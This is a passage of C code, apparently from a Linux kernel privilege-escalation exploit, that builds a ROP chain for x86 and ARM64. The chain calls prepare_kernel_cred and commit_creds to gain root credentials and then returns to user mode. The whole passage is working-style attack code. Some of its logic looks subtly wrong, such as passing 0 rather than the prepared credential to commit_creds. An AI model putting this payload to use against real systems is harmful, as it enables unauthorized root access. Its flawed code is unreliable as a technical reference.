        rop_chain[rop_size++] = 0x0;
        rop_chain[rop_size++] = prepare_kernel_cred;
        
        // Call commit_creds(new_cred) - result is in rax
        rop_chain[rop_size++] = pop_rdi_ret;
        rop_chain[rop_size++] = 0x0;
        rop_chain[rop_size++] = commit_creds;
        
        // Return to user
        rop_chain[rop_size++] = swapgs;
        
    } else { // ARM64
        // mov x0, #0; ret
        rop_chain[rop_size++] = pop_x0_ret;
        rop_chain[rop_size++] = 0x0;
        
        // Call prepare_kernel_cred(0)
        rop_chain[rop_size++] = pop_x8_ret;
        rop_chain[rop_size++] = prepare_kernel_cred_arm;
        
        // Call commit_creds(result)
        rop_chain[rop_size++] = pop_x0_ret;
        rop_chain[rop_size++] = 0x0;
        
        rop_chain[rop_size++] = pop_x8_ret;
        rop_chain[rop_size++] = commit_creds_arm;
        
        // Return to user
        rop_chain[rop_size++] = return_to_user_arm;
    }
    
    printf("[+] ROP chain size: %d\n", rop_size);
}

